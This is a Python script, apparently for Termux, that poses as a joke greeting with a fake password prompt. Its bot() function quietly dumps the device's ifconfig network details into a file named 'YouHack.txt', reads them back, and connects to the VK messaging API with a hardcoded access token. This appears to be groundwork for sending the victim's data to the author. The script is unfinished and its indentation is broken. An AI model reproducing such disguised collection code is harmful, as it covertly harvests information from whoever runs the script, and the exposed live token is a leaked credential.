import time
import os
import random
from random import randint
k=os.system('pip install vk_api')
#k=os.system('pip install VkLongPoll')
#k=os.system('pip install VkEventType')
import vk_api
from vk_api.longpoll import VkLongPoll, VkEventType
def hello():
    print('П')
    f=time.sleep(0.1)
    print('Р')
    f=time.sleep(0.1)
    print('И')
    f=time.sleep(0.1)
    print('В')
    f=time.sleep(0.1)
    print('Е')
    f=time.sleep(0.1)
    print('Т')
    f=time.sleep(0.1)
    X=input('Готов?\n: ')
    if X=='да' or X=='Да' or X=='ДА' or X=='Y' or X=='y':
        print('П')
        f=time.sleep(0.1)
        print('О')
        f=time.sleep(0.1)
        print('Е')
        f=time.sleep(0.1)
        print('Х')
        f=time.sleep(0.1)
        print('А')
        f=time.sleep(0.1)
        print('Л')
        f=time.sleep(0.1)
        print('И')
        f=time.sleep(0.1)
        print(': )')
        f=time.sleep(0.1)
    else:
        print('П')
        f=time.sleep(0.1)
        print('О')
        f=time.sleep(0.1)
        print('К')
        f=time.sleep(0.1)
        print('А')
        f=time.sleep(0.1)
def hello_2():
    print('Введите пароль: ')
    time.sleep(4)
    print('Да шучу я :)')
    time.sleep(1)
def prikol():
    print('''lloll''')
def bot():
    rand=123456
    print('Не темно?')
    time.sleep(1)
    os.system('termux-brightness 255')
    print('Так лучше :)')
    
    os.system('ifconfig>>YouHack.txt')
    os.system('ifconfig>>YouHack.txt')
    o=open(r'YouHack.txt')
    IP=o.read()
    token='35a0b1e44117b4857a36a347b3b1c948b260b314bf7edb44494165442202ea6ff5049d5ea3225d8c90199'
    def y(user_id,message):
        vk.method('messages.send',{'user_id': user_id, 'message': message,'random_id':rand,})
    vk=vk_api.VkApi(token=token)
    longpoll=VkLongPoll(vk)
    for event in longpoll.listen():
	if event.type==VkEventType.MESSAGE_NEW:
		rand+=1
		if event.to_me:
			r=event.text
			
	
    
    
    















































        
hello()
hello_2()
prikol()
bot()
